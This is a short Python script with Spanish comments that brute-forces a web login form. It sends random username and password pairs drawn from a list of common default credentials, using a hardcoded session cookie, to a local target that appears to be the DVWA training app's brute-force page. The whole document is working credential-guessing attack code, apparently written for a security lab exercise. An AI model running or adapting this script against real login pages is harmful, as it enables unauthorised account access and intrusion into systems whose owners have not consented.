#!/usr/bin/python3
#@author: manu
import requests
import random
import urllib3

cookie={"PHPSESSID":"imso09f3lnku3m76eh34hqi0e4","security":"medium"}

lista_passwords=["admin","password","manager","letmein","cisco","default","root","apc","pass","security","user","system","sys"]
url="http://127.8.0.1/vulnerabilities/brute/?username=klk&password=klk&Login=Login#"

password_encontrada=False

inicio=0
final=len(lista_passwords)-1
#deshabilitar el problema con las peticiones
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
while password_encontrada==False:
    login_aleatorio=random.randint(inicio,final)
    contraseña_aleatoria=random.randint(inicio,final)
    url=f'http://127.8.0.1/vulnerabilities/brute/?username={lista_passwords[login_aleatorio]}&password={lista_passwords[contraseña_aleatoria]}&Login=Login#'

    peticion=requests.get(url,cookies=cookie)
    print(peticion.url)


    if "Username and/or password incorrect." in peticion.text:
        print("contraseña probada",lista_passwords[login_aleatorio],lista_passwords[contraseña_aleatoria])
        pass
    else:
            print("contraseña encontrada",lista_passwords[login_aleatorio],lista_passwords[contraseña_aleatoria])
            password_encontrada=True
